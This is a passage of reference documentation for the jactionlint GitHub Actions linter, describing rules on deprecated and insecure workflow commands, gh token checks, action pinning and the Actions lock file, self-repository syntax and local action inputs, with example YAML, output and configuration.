**Fix.** `--fix` puts the missing `$` in front of the name and keeps the quotes that the word already has. The fix for the second case writes `>>`. It is unsafe, because a script may reset the file on purpose, so `--fix` applies it only with `--fix=unsafe`.

<a id="check-deprecated-workflow-commands"></a>
## Deprecated workflow commands

The rule `deprecated-commands` reports a `run:` script that prints a workflow command which GitHub deprecated. The finding names the replacement.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: 'set-output' workflow command was deprecated
      - run: echo '::set-output name=foo::bar'
      # OK: Use this instead
      - run: echo "foo=bar" >> "$GITHUB_OUTPUT"
      # OK: 'debug' command is not deprecated
      - run: echo "::debug::Set the Octocat variable"
```

Output:

```
test.yaml:8:14: workflow command "set-output" was deprecated. use `echo "{name}={value}" >> $GITHUB_OUTPUT` instead: https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions [deprecated-commands]
  |
8 |       - run: echo '::set-output name=foo::bar'
  |              ^~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpsyjGOgzAQRuGeU/yyVqLyBUaCYpvdrVgpUEc2GUIi4kH2TM4fOWmpXvE+SYTdyto0d4mFGkC5aC2QLRVfgUVLan4L9b1XUd7LRwG+SgLPq6AlKqxeTHdTpPDgbhEhiiG3B9wtIl0M2aHv4b5+/sbf6fs8TOP/NLojT3ThaFeiEyt0ZQyzyhwUz5BvIW7sXgMAzI0+6A==)

**What is reported.** GitHub deprecated these commands ([`set-output` and `save-state`](https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/), [`set-env` and `add-path`](https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/)):

| Deprecated command | Write to this file instead |
| --- | --- |
| `::set-output name={name}::{value}` | `echo "{name}={value}" >> $GITHUB_OUTPUT` |
| `::save-state name={name}::{value}` | `echo "{name}={value}" >> $GITHUB_STATE` |
| `::set-env name={name}::{value}` | `echo "{name}={value}" >> $GITHUB_ENV` |
| `::add-path::{path}` | `echo "{path}" >> $GITHUB_PATH` |

The rule reads the text of the script, so the command has to appear literally, with a name that starts with a letter, and a value. A command that a script builds from variables is not recognized. The finding is at the start of the script. [The workflow commands of GitHub](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions) list the commands that are not deprecated, such as `::debug::`.

**Related.** The rule [insecure workflow commands](#check-insecure-commands) reports the variable that turns the deprecated `set-env` and `add-path` commands back on.

<a id="check-insecure-commands"></a>
## Insecure workflow commands

The rule `insecure-commands` reports a workflow, a job or a step that sets the environment variable `ACTIONS_ALLOW_UNSECURE_COMMANDS` to `true`. The rule is in the `default` profile.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$HOME/.local/bin" >> "$GITHUB_PATH"
        env:
          ACTIONS_ALLOW_UNSECURE_COMMANDS: true
```

Output:

```
test.yaml:8:11: the step enables the deprecated insecure workflow commands "set-env" and "add-path" with ACTIONS_ALLOW_UNSECURE_COMMANDS. any output of a step can inject environment variables with them. remove the variable and write to the files $GITHUB_ENV and $GITHUB_PATH instead [insecure-commands]
  |
8 |           ACTIONS_ALLOW_UNSECURE_COMMANDS: true
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo8y8GKgzAYBOC7TzEEr673HISsK6ugZlmVHoOxAS0hEZO/z19sS28zzDfecewU1uTmdeAJoGmz1zMAB7mQnYA0uUiZnaMJ8TmFaPbwUkB2Sg6zrB4srWVX5V/WL7PN9eYYigIs/W3GevpWf2Ks2fsGGHfnnwKIcmxkPyjRtvKipn6oyum/UqXsOtH/DBzxIPMYAK27MTc=)

**Why it matters.** GitHub [deprecated the workflow commands](https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/) `::set-env` and `::add-path`, because anything that can print a line to the log of a step can use them to inject environment variables, and so to run code. This variable opts back in to them. The value counts when it is `true` in any case; `1` does not enable the commands, so jactionlint does not report it.

**Fix.** Write to the environment files instead (`$GITHUB_ENV`, `$GITHUB_PATH`) and remove the variable. The [deprecated workflow commands](#check-deprecated-workflow-commands) check reports the commands themselves.

The rule is fixable, but the fix is **unsafe**: `jactionlint --fix=unsafe` removes the variable, and the `env:` mapping when it was the only entry. It does so only for an entry on a single line of a block mapping. A step that still prints `::set-env` or `::add-path` stops working after that, so replace the commands first.

<a id="check-gh-without-token"></a>
## The gh command without a token

The rule `gh-without-token` reports a `run:` script that runs the `gh` command of GitHub CLI although no token reaches the step, so that `gh` stops. The GitHub-hosted runners have the GitHub CLI installed, but it is not logged in. It stops with `gh: To use GitHub CLI in a GitHub Actions workflow, set the GH_TOKEN environment variable` unless one of `GH_TOKEN`, `GITHUB_TOKEN`, `GH_ENTERPRISE_TOKEN` or `GITHUB_ENTERPRISE_TOKEN` is in its environment.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: gh stops because neither GH_TOKEN nor GITHUB_TOKEN is set
      - run: gh pr list --state open
      # OK: the token is set for the step
      - run: gh pr list --state open
        env:
          GH_TOKEN: ${{ github.token }}
      # OK: gh --version and gh help need no token
      - run: gh --version
```

Output:

```
test.yaml:8:14: command "gh pr list" stops with "set the GH_TOKEN environment variable" because neither GH_TOKEN nor GITHUB_TOKEN is set for this step, its job or the workflow. set `GH_TOKEN: ${{ github.token }}` in the `env:` of the step [gh-without-token]
  |
8 |       - run: gh pr list --state open
  |              ^~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqUzLEKAjEMxvH9nuIbXOMDdBcFQRd3uUK4Vo+0NMktx727VMHFySmE/4+vSEB1TcPwKFHDABir9Qs0F6UOPLqY0zz29k5qXPWjAOoyYEqoDXNWA5HaaIxSWf5BAMsSvg9wPN1v1/PhErBbV0zZkse9lScLtu1nmWjhprnIawBNrD3Z)

**What is reported.** A `gh` command of a `run:` script on a GitHub-hosted runner, when none of these variables is set in the `env:` of the step, of the job (and its `container:`) or of the workflow ([actionlint#246](https://github.com/rhysd/actionlint/issues/246)). The rule finds the command by parsing the script, so a name in a comment, a string, a heredoc or an `echo` is not a command. It reports the first `gh` command of each step.

Only the commands that need a logged-in user are reported: `api`, `attestation`, `cache`, `codespace`, `gist`, `gpg-key`, `issue`, `label`, `org`, `pr`, `project`, `release`, `repo`, `ruleset`, `run`, `search`, `secret`, `ssh-key`, `status`, `variable` and `workflow`. A command with `--help`, `-h` or `--version`, and every other command (`gh auth`, `gh config`, `gh extension`, `gh help`, `gh completion`, `gh browse`, `gh alias`, a command of an extension), need no token and are not reported.

**What is not reported.** The rule is silent when it cannot be sure that the token is missing:

- The script names `GH_TOKEN`, `GITHUB_TOKEN`, `github.token`, `hosts.yml` or `gh auth login`, for example `GH_TOKEN=... gh ...`, `export GH_TOKEN=...` and `gh auth login --with-token`.
- An earlier step of the job writes a token to `$GITHUB_ENV`, runs `gh auth login`, exports a variable in a `github-script` or calls a local action (whose metadata is not read, and which could do any of that): the steps after it are not reported.
- An `env:` is an expression.
- The job does not run on a runner that is shown to be GitHub-hosted: a `self-hosted` label, a runner group, a custom label or a `matrix` value that is not a hosted label (a self-hosted runner can be logged in already).
- The script is not `bash` or `sh` (the default shell of a Windows runner is PowerShell).

**Fix.** There is no fix, because the rule does not choose the token for you. `${{ github.token }}` is the token of the workflow, and the `permissions:` of the workflow or the job decide what it can do ([permissions](#check-permissions)).

<a id="check-action-format"></a>
## Action format in `uses:`

The rule `invalid-uses` reports a `uses:` value that does not follow the format of an action, a reusable workflow or a Docker image, and the rule `unpinned-uses` reports one that is not pinned to a commit. `invalid-uses` is in the `correctness` profile and `unpinned-uses` in the `default` profile.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: ref is missing
      - uses: actions/checkout
      # ERROR: owner name is missing
      - uses: checkout@v2
      # ERROR: tag is empty
      - uses: 'docker://image:'
      # ERROR: local action must start with './'
      - uses: .github/my-actions/do-something
```

Output:

```
test.yaml:7:15: specifying action "actions/checkout" in invalid format because ref is missing. available formats are "{owner}/{repo}@{ref}" or "{owner}/{repo}/{path}@{ref}" [invalid-uses]
  |
7 |       - uses: actions/checkout
  |               ^~~~~~~~~~~~~~~~
test.yaml:9:15: specifying action "checkout@v2" in invalid format because owner is missing. available formats are "{owner}/{repo}@{ref}" or "{owner}/{repo}/{path}@{ref}" [invalid-uses]
  |
9 |       - uses: checkout@v2
  |               ^~~~~~~~~~~
test.yaml:11:15: tag of Docker action should not be empty: "docker://image" [invalid-uses]
   |
11 |       - uses: 'docker://image:'
   |               ^~~~~~~~~~~~~~~~~
test.yaml:13:15: specifying action ".github/my-actions/do-something" in invalid format because ref is missing. available formats are "{owner}/{repo}@{ref}" or "{owner}/{repo}/{path}@{ref}" [invalid-uses]
   |
13 |       - uses: .github/my-actions/do-something
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpczbEOwyAMBNA9X+EtE0XqyNRfAWIBTbGj2K7Uv69olYXppHsnHVOAw6QuT04SFgBF0ZEAp5G44ZaM1NwrDvuRKB7yXwE4MEEJELM2JvG5Yt7ZdOKrfrzvk6wb5x3P4H3rsWBYJ7+VptWS7x93fWzshDtqbVS+AwCoTjwo)

GitHub defines the formats of `uses:` in [the workflow syntax reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsuses). A step takes one of these forms:

- an action hosted on GitHub: `owner/repo/path@ref`
- a local action: `./path/to/my-action`
- a self-repository action: `$/path/to/my-action`
- a Docker action: `docker://image:tag`

`invalid-uses` reports a value that follows none of them, as the four findings of the example show.

**Self-repository form.** The form `$/path` resolves against the repository that runs the workflow, at the exact commit that runs it, so it needs no checkout and takes no `@ref`. It is accepted everywhere the workspace-relative `./` form is, and jactionlint resolves both to the same path in the repository. The pedantic rule [`self-repository`](#check-self-repository) asks you to write `$/` instead of `./`.

For that reason `$/` is checked more strictly than `./`. The rule `invalid-local-action` reports a `$/path@ref` (a self-repository reference cannot have a ref), a path that leaves the repository (`$/../x`), and a `$/path` without an `action.yml` or `action.yaml` in the repository, which is a certain failure at run time. The last one is not reported when the path is in a submodule or when the repository is not known (standard input). The same checks apply to the steps of a composite action and, for the ref and the path, to a reusable workflow called with `$/`.

**Expressions.** An expression (`${{ }}`) is not allowed in `uses:` of a step or of a job that calls a reusable workflow: GitHub resolves the action when it reads the workflow file, before any expression is evaluated, so the reference must be written out. The rule `context-availability` reports it.

**What is not reported.** A directory of a local action (`./path`) that does not exist in the repository is not reported, because the action is often managed in a separate repository and cloned while the workflow runs (see the actionlint issues [#25](https://github.com/rhysd/actionlint/issues/25) and [#40](https://github.com/rhysd/actionlint/issues/40)).

### Require pinning to a commit hash

The rule `unpinned-uses` reports an action that is not pinned to a commit. Tags and branches are mutable, so pinning to a full commit hash mitigates supply chain attacks. To set the level of the rule or to turn it off, use [the configuration file](config.md#rules):

```yaml
rules:
  unpinned-uses: error
```

**What is reported.** jactionlint reports the following at `uses:`:

- an action hosted on GitHub (`owner/repo@ref`, `owner/repo/path@ref`) whose ref is not a full-length 40-digit hexadecimal commit SHA (abbreviated SHAs, tags and branches are reported)
- a Docker action (`docker://image`) that is not pinned by digest, that is `docker://image@sha256:{64 hex digits}`
- a reusable workflow call (`owner/repo/.github/workflows/x.yml@ref`) whose ref is not a full-length commit SHA

**What is not reported.** Local actions and workflows (`./path`, `$/path`) always run at the commit of the workflow itself, so they are not reported. A `uses:` value that contains a `${{ }}` expression is skipped, since it cannot be checked statically. A tag that the [Actions lock file](#check-actions-lock) pins to a commit for the workflow is accepted.

**Fix.** Replace the tag with the commit SHA and keep the tag in a comment (`uses: actions/checkout@<sha> # v4.2.2`). With `--online --fix` jactionlint does it: it pins the tag to its commit and names the tag in a comment, which is the most specific version tag of the commit (`# v4.2.2` for `@v4`), or the tag as written with the option `short-pin-comment: true` of `unpinned-uses`. See [the online checks](online.md#online-checks).

**Configure.** By default every action must be pinned to a full commit SHA. The option `policies` relaxes that for the repositories you trust. The policies follow those of the `unpinned-uses` audit of zizmor; [the parity page](zizmor-parity.md) lists the differences:

```yaml
rules:
  unpinned-uses:
    level: error
    policies:
      actions/checkout: hash-pin
      actions/*: ref-pin
      my-org/*: any
```

Each key is a pattern for the repository of the `uses:` value, and the value is the policy:

- `hash-pin`: a full-length commit SHA is required (for Docker images, a digest). This is the policy of everything that no pattern matches.
- `ref-pin`: any tag, branch or commit SHA is accepted. For Docker images, a tag other than `latest` or a digest is required.
- `immutable-release`: like `hash-pin`, and with `--online` the tag of an [immutable release](https://docs.github.com/en/code-security/concepts/supply-chain-security/immutable-releases) is accepted as well (`uses: astral-sh/setup-uv@v10.3.0`). Without `--online` it is `hash-pin`: the message says that an immutable release would do. See [Tags of immutable releases](#check-immutable-release).
- `any`: nothing is required.

The patterns are `*` (everything), `owner/*`, `owner/repo` and `owner/repo/path` (the path and everything under it). Owners and repositories are compared case-insensitively. When several patterns match, the most specific one wins whatever the order they are written in: in the example, `actions/checkout` needs a commit SHA while the other `actions/*` actions only need a ref. Reusable workflow calls follow the same patterns. Patterns describe repositories, so a Docker image follows the `*` pattern. Invalid patterns and unknown policies are rejected when the configuration is read.

<a id="check-immutable-release"></a>
#### Tags of immutable releases (online)

The policy `immutable-release` of the option `policies` of the rule `unpinned-uses` accepts the tag of an [immutable release](https://docs.github.com/en/code-security/concepts/supply-chain-security/immutable-releases) instead of a commit hash. It needs `--online`: without it the policy is `hash-pin`.

When a repository publishes its releases as immutable, GitHub locks the tag of each release (it cannot be moved or deleted) and its assets, so that `uses: owner/repo@v1.2.3` runs the same code for as long as the release exists, which is what pinning to a commit is for. Set the policy in [the configuration file](config.md#rules):

```yaml
rules:
  unpinned-uses:
    level: error
    policies:
      '*': immutable-release
```

**What is accepted.** With `--online` a ref is accepted when all of these hold, and is reported as with `hash-pin` otherwise:

- `GET /repos/{owner}/{repo}/releases/tags/{ref}` answers a published release with `"immutable": true`. This is the field of the release object of the REST API (the endpoint "Get a release by tag name"). A tag without a release (a moving tag such as `v4`), a release that was published before the repository turned immutability on, and a draft are not immutable.
- No branch has the name of the tag, because `uses: owner/repo@v1.2.3` would be ambiguous (see [Ref confusion](#check-ref-confusion)): a branch can be pushed by whoever can write to the repository, whatever the release says.
- The `uses:` is an action or a reusable workflow of a GitHub repository, and the ref is a plain tag name (a ref with a `/`, a branch and a commit SHA are not looked up: a commit is accepted by every policy anyway).

**Cost and limits.** A lookup that fails (403, rate limit, no network, `--online=cache` without the answer) keeps the finding and counts as a skipped lookup. The policy costs one request for each tag of the run that it leaves open (the answer "no release" is cached too, like every answer), and one for the branch of the same name for each immutable tag, a lookup that the rule `ref-confusion` and `--fix` share. Nothing is asked for the repositories that another policy matches, or for a configuration without `immutable-release`. The setting protects the tag, not the author: an immutable release of a repository that was taken over later still runs what its author published.

<a id="check-actions-lock"></a>
### GitHub Actions lock file

The rule `unpinned-uses` accepts a tag that the Actions lock file of the repository pins to a commit, and the rule `actions-lock` reports where the lock file and the workflows disagree. With `--online`, the rule `actions-lock-drift` compares the pins of the lock file with GitHub.

> [!WARNING]
> The Actions lock file is a **technical preview** of GitHub and its format is pre-1.0 (jactionlint reads the versions `v0.0.2` and `v0.0.3`). It may change without notice. jactionlint reads only what is described in this section, ignores the keys it does not know, and does not trust a file of a version whose shape it does not know, so a change of the format brings back findings and never hides one.

A repository can lock the actions of its workflows with the [`gh actions-lock`](https://github.com/github/gh-actions-lock) extension of the GitHub CLI. It writes `.github/workflows/actions.lock`, which records for each workflow which actions it uses and, for every action, the commit it was resolved to (the format is defined in [github/actions-lockfile](https://github.com/github/actions-lockfile)). A workflow that is listed there keeps `uses: actions/checkout@v6.0.2` in its YAML, and the runner checks out the locked commit. That is why the rule `unpinned-uses` does not report such a tag:

```yaml
version: 'v0.0.3'
workflows:
    '.github/workflows/ci.yml':
        - 'actions/checkout@v6.0.2'
dependencies:
    'actions/checkout@v6.0.2':
        ref: 'v6.0.2'
        commit: 'sha1-de0fac2e4500dabe0009e67214ff5f5447ce83dd'
        owner_id: 44036562
        repo_id: 197814629
```

`unpinned-uses` accepts a step `uses: owner/repo@ref` (or `owner/repo/path@ref`; a sub action is locked by its repository) when the lock file of the repository, which is `.github/workflows/actions.lock` at its root:

- lists the workflow being checked under `workflows`, and the list has `owner/repo@ref` with the same ref (the owner and the repository are compared case-insensitively, the ref is not);
- has a `dependencies` entry for that pin whose `ref` is the same ref and whose `commit` is a full digest (`sha1-` and 40 hex digits, or `sha256-` and 64).

`unpinned-uses` checks nothing else about the file: it does not look the commit up on GitHub, and it does not follow the actions inside a locked composite action. [CodeQL](https://github.com/github/codeql/pull/22155) reads the file the same way for its query `actions/unpinned-tag`.

**When the rule is unchanged.** The rule `unpinned-uses` judges a step as without a lock file when:

- the repository has no lock file, it is not valid YAML, it does not have the shape of the format, it has no `version` or the version is not `v0.0.2` or `v0.0.3` (`v0.0.1` is not read), or a key is repeated (a workflow, a dependency, or a key of one): the official parser rejects such a file, so neither the first nor the last entry is trusted;
- the workflow is not listed in the file: workflows are onboarded to the lock file one by one, and only a listed workflow is held to it (`gh actions-lock --verify` reports the others);
- the entry of the action is missing or malformed (a ref that differs from the one of the pin, a `commit` that is not a digest);
- the `uses:` is a reusable workflow call (`owner/repo/.github/workflows/x.yml@ref`) or a Docker image. `gh actions-lock` does not record them, so they are judged as without a lock file. Some lock files in the wild list the pins of reusable workflows too; jactionlint does not rely on them.

**Local actions.** A step of a local action (`action.yml`) is read the way the lock file records it: the actions that a local action uses are listed under the workflows that run it with `uses: $/path` or `./path` (directly or through other local actions; a reusable workflow in between is a workflow of its own). Such a step is accepted when every workflow that runs the action is listed in the lock file and pins it. An action that no workflow of the repository runs is not locked, so its steps are reported.

**Fix.** The fix of `unpinned-uses` under `--online`, which writes the commit SHA in `uses:`, is not offered for a step of a workflow that the lock file lists, because a ref with a SHA is another pin than the one of the lock file and can make the workflow fail the lock check. Add the entry with `gh actions-lock` instead. The fix is unchanged for reusable workflow calls and for the workflows that the lock file does not list.

**Configure.** The option `actions-lock` of `unpinned-uses` turns the lock file off, for a repository that wants every action pinned in the YAML whatever the lock file says:

```yaml
rules:
  unpinned-uses:
    level: error
    actions-lock: false
```

#### The rule `actions-lock`

The rule `actions-lock` reads the lock file the way `gh actions-lock --verify-local` does (offline, nothing is looked up), and reports where the lock file and the workflows disagree. It reports nothing in a repository that has no lock file, and nothing from a lock file of another version number than `v0.0.2` or `v0.0.3` (a `version` that is not a version number at all, such as `vx`, is reported). It is in the `default` profile and reports `error`, because a workflow that the lock file lists must list every action it uses (the README of `gh actions-lock`: "Workflows that are onboarded to the lockfile enforce that all dependencies are present in the lockfile"). jactionlint checks the lock file with the workflows when it lints the repository (`jactionlint` with no file names), or when you name `.github/workflows/actions.lock`.

The example is a workflow and the lock file of the repository. The first line of each listing names the file and is not part of it:

```yaml
# .github/workflows/ci.yml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the lock file pins actions/checkout at v4, not at v5
      - uses: actions/checkout@v5
      # ERROR: the lock file has no entry for it
      - uses: actions/setup-node@v4
```

```yaml
# .github/workflows/actions.lock
version: 'v0.0.3'
workflows:
    '.github/workflows/ci.yml':
        - 'actions/cache@v4'     # ERROR: the workflow does not use it any more
        - 'actions/checkout@v4'  # ERROR: the workflow uses v5 now
dependencies:
    'actions/cache@v4':
        ref: 'v4'
        commit: 'sha1-0057852bfaa89a56745cba8c7296529d2fc39830'
        owner_id: 44036562
        repo_id: 54212171
    'actions/checkout@v4':
        ref: 'v4'
        commit: 'sha1-11bd71901bbe5b1630ceea73d27597364c9af683'
        owner_id: 44036562
        repo_id: 197814629
```

The `# ERROR` comments on the lines of the lock file mark them for you. The output was produced from the lock file without them, so remove them to get exactly this output. The output keeps only the findings of `actions-lock`: `jactionlint --select actions-lock` prints it for these two files.

The output of `jactionlint` for this repository:

```
.github/workflows/ci.yml:7:15: action "actions/checkout@v5" is not in .github/workflows/actions.lock for this workflow, which pins actions/checkout at "v4". the ref was changed after the lock file was written. run `gh actions-lock` to lock the new ref [actions-lock]
  |
7 |       - uses: actions/checkout@v5
  |               ^~~~~~~~~~~~~~~~~~~
.github/workflows/ci.yml:9:15: action "actions/setup-node@v4" is not in .github/workflows/actions.lock for this workflow. a workflow which the lock file lists must list every action it uses. run `gh actions-lock` to add it [actions-lock]
  |
9 |       - uses: actions/setup-node@v4
  |               ^~~~~~~~~~~~~~~~~~~~~
.github/workflows/actions.lock:4:11: "actions/cache@v4" is listed for the workflow ".github/workflows/ci.yml" but the workflow does not use it. run `gh actions-lock` to prune the entry [actions-lock]
  |
4 |         - 'actions/cache@v4'
  |           ^~~~~~~~~~~~~~~~~~
.github/workflows/actions.lock:5:11: "actions/checkout@v4" is listed for the workflow ".github/workflows/ci.yml" but the workflow does not use it. run `gh actions-lock` to prune the entry [actions-lock]
  |
5 |         - 'actions/checkout@v4'
  |           ^~~~~~~~~~~~~~~~~~~~~
```

**What is reported.**

- **In a workflow, or in a local action that a listed workflow runs:** an action (`owner/repo@ref`) that the lock file does not list for the workflow, or lists at another ref. A commit SHA in `uses:` is matched with the entry that was resolved to that commit, as `gh actions-lock` does. Reusable workflows and Docker images are not checked, because `gh actions-lock` does not record them.
- **In the lock file, an entry that does not follow the format:** a file that is not YAML or has not the keys `version`, `workflows` and `dependencies` of the right shape; a pin that is not `owner/repo@ref`; a dependency without `ref`, without a `commit` that is a digest (`sha1-` and 40 hex digits, or `sha256-` and 64), or without a positive `owner_id` and `repo_id`; a `ref` that differs from the ref of the key (unless the key is a commit SHA, where `ref` is the tag it was found by); a key that is a commit SHA with another `commit`; a `hostname` that is not `github.com` or a tenant of `ghe.com`; a workflow path that goes out of the repository; a pin that has no entry under `dependencies`; dependencies that use each other in a circle. Keys that the rule does not know are ignored.
- **In the lock file, an entry that nothing uses:** a workflow that does not exist any more, a pin that a listed workflow does not use any more (a version bump without `gh actions-lock` leaves the old pin behind and the new one missing, as in the example), and a dependency that no workflow reaches. The actions that a workflow reaches through `$/path` or `./path` local actions count as used. When something the workflow runs cannot be read (an expression in `uses:`, a local action that does not exist), its pins are not reported as stale.

**Configure.** The option `pedantic` (true under the `pedantic` profile) adds two checks that are a matter of taste: a workflow that the lock file does not list although it uses actions (workflows are onboarded one by one, so this can be on purpose; a workflow without actions has nothing to lock), and a commit SHA whose version comment (`# v4.0.0`) names another version than the one the lock file resolved the commit from (`# v4` is accepted for `v4.3.1`).

```yaml
rules:
  actions-lock:
    level: error
    pedantic: true
```

##### Online: `actions-lock-drift`

With `--online` the rule `actions-lock-drift` compares each pin of the lock file with GitHub, with the answers the other online checks use. It reports `error` for a pin whose:

- repository is not the one that was locked: GitHub has another `repo_id` for the name (the repository was deleted and created again, or the name was taken over); or it is the same repository (the `repo_id` stays) under another name or owner, which is a rename or a transfer that the runner refuses;
- full version tag (`v4.2.1`) points to another commit than the `commit` of the lock file, which is a moved tag;
- commit is on no branch or tag of the repository (an impostor commit, as the rule `impostor-commit` finds for a commit in `uses:`).

Mutable refs (`v4`, a branch) may move, so only the history of the commit is checked for them. A repository that GitHub does not show (private, deleted) gets no verdict, and neither does a commit that GitHub does not know at all, because both look the same to the API. Pins of another instance than `github.com` (`hostname` is a `ghe.com` tenant) are not looked up.

<a id="check-local-action-checkout"></a>
### Local action used before checkout

The rule `local-action-checkout` reports the first local action of a job that no checkout step precedes in the same job. A local action (`uses: ./.github/actions/foo`) is loaded from the workspace of the runner. When the repository has not been checked out yet, the step fails at run time with "Can't find 'action.yml'".

The rule is in the `correctness` profile. jactionlint cannot know how your runner prepares the workspace, so turn the rule off when it does not apply to your runners, in [the configuration file](config.md#rules):

```yaml
rules:
  local-action-checkout: off
```

With the rule enabled, the following workflow is reported at `uses: ./.github/actions/foo`, because `actions/checkout` comes after it:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/foo
      - uses: actions/checkout@v4
```

**What counts as a checkout.** A job is considered to check out the repository when an earlier step in the same job:

- uses an action whose name contains `checkout` (for example `actions/checkout`, or a wrapper such as `pytorch/pytorch/.github/actions/checkout-pytorch`; the owner, the repository and the path in the repository count);
- uses a remote action with an input that only a checkout has (`fetch-depth`, `persist-credentials`, `submodules`, `sparse-checkout`, `sparse-checkout-cone-mode`, `lfs`, `fetch-tags`, `set-safe-directory`);
- has a `run:` script with a line that contains `git` and one of `clone`, `init`, `fetch`, `pull`, `checkout`, `worktree` or `submodule`, or `gh repo clone` or `gh pr checkout`.

**Known limits.** [Ignore the finding](ignore.md#ignore-some-errors) when one of them matters:

- Whether the checkout step actually runs (`if:`) is not considered.
- A self-hosted runner may keep the workspace between jobs, so a job without a checkout step can work there.
- A step that generates the action directory without checking out the repository is reported.
- What a remote composite action does cannot be known without fetching it, so the name and the inputs are a heuristic: a wrapper with an unrelated name and none of the inputs listed for a checkout is not taken for a checkout and the next local action is reported. A composite action of the repository itself (`uses: owner/repo/.github/actions/prep@main`, where `owner/repo` is the `origin` of the clone) counts as a wrapper that checks out, whatever its name. `--online` does not change that: the online client has no lookup for the files of a repository, so the action is not fetched to look inside it.
- A local action outside of `.github/` (`./sources/repo/.github/actions/build`) after a step that downloads an artifact or unpacks an archive (`actions/download-artifact`, `tar`, `unzip`, ...) is not reported: the files may come from there.
- `uses: $/path` (self-repository syntax) is never reported, since it needs no checkout, and neither are `uses:` of reusable workflows and composite action files.

<a id="check-self-repository"></a>
## Self-repository syntax (pedantic)

The rule `self-repository` reports a `uses: ./path` and asks for `uses: $/path`. It is in the `pedantic` profile and reports `info`, because the syntax is new and needs runner 2.336.0 or newer.

Example input:

```yaml
# select: self-repository
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
        with:
          persist-credentials: false
      # ERROR: looked up in the workspace at run time
      - uses: ./.github/actions/setup
      # OK
      - uses: $/.github/actions/setup
  call:
    # ERROR: the same for reusable workflows
    uses: ./.github/workflows/reusable.yml
```

Example file: .github/actions/setup/action.yml

```yaml
name: Setup
description: Sets up the project
runs:
  using: composite
  steps:
    - run: echo setup
      shell: bash
```

Example file: .github/workflows/reusable.yml

```yaml
on: workflow_call
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo build
```

Example config:

```yaml
rules:
  self-repository: error
```

Output:

```
test.yaml:12:15: "./.github/actions/setup" is looked up in the workspace at run time, where an earlier step can replace it. use the self-repository syntax "$/.github/actions/setup" which always refers to the commit running the workflow [self-repository]
   |
12 |       - uses: ./.github/actions/setup
   |               ^~~~~~~~~~~~~~~~~~~~~~~
test.yaml:17:11: "./.github/workflows/reusable.yml" is a path that cannot be told apart from an arbitrary directory by a policy that requires pinning. use the self-repository syntax "$/.github/workflows/reusable.yml", which names the reusable workflow of this repository at the commit running the workflow [self-repository]
   |
17 |     uses: ./.github/workflows/reusable.yml
   |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

Both forms name an action or a reusable workflow of the repository that runs the workflow. `./path` is looked up in the workspace of the runner, so any earlier step can change what it runs (a checkout of another ref or repository, or a script writing an `action.yml`), and a policy cannot tell it from an arbitrary directory. `$/path` always resolves to the commit that runs the workflow.

**Configure.** The output shows only the findings of this rule, at the level `error` that the example config sets: `rules: {self-repository: error}`. The default level is `info`, and a finding of that level starts with `info:`. The workflow of the example runs in a repository that has the action `.github/actions/setup` and the workflow `.github/workflows/reusable.yml`, which are the two `Example file:` blocks.

**Fix.** `jactionlint --fix=unsafe` rewrites `./` to `$/`. The fix is unsafe because the two forms are not the same when a step replaces the workspace content, which is exactly the case the rule is about, and because `$/` needs runner 2.336.0 or newer. Older versions of the original actionlint reject it (`specifying action "$/..." in invalid format`), so a repository that also runs actionlint starts to fail there. Check which tools read your workflows before you apply the fix; [the migration guide](v2-migration.md#fix) has the details.

**Related.** `uses: $/path` needs no checkout step, and [`local-action-checkout`](#check-local-action-checkout) does not report it. [Action format in `uses:`](#check-action-format) lists what `invalid-local-action` reports for a `$/` reference.

<a id="check-local-action-inputs"></a>
## Local action inputs validation at `with:`

The rules `missing-action-input` and `unknown-action-input` report a required input that a step does not set at `with:`, and an input that the action does not define. For an action of the same repository, jactionlint reads the `action.yml` file of the action. Both rules are in the `correctness` profile.

The example calls the local action `My action`, defined in `.github/actions/my-action/action.yaml`.

Example input:

```yaml
# select: missing-action-input,unknown-action-input
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # missing required input "message"
      - uses: ./.github/actions/my-action
      # unexpected input "additions"
      - uses: ./.github/actions/my-action
        with:
          name: rhysd
          message: hello
          additions: foo, bar
```

Example file: .github/actions/my-action/action.yaml

```yaml
name: 'My action'
author: 'octocat'
description: 'my action'

inputs:
  name:
    description: your name
    default: anonymous
  message:
    description: message to this action
    required: true
  addition:
    description: additional information
    required: false

runs:
  using: 'node20'
  main: 'index.js'
```

Output:

```
test.yaml:8:15: missing input "message" which is required by action "My action" defined at "./.github/actions/my-action". all required inputs are "message" [missing-action-input]
  |
8 |       - uses: ./.github/actions/my-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:14:11: input "additions" is not defined in action "My action" defined at "./.github/actions/my-action". available inputs are "addition", "message", "name" [unknown-action-input]
   |
14 |           additions: foo, bar
   |           ^~~~~~~~~~
```

<!-- Skip playground link -->

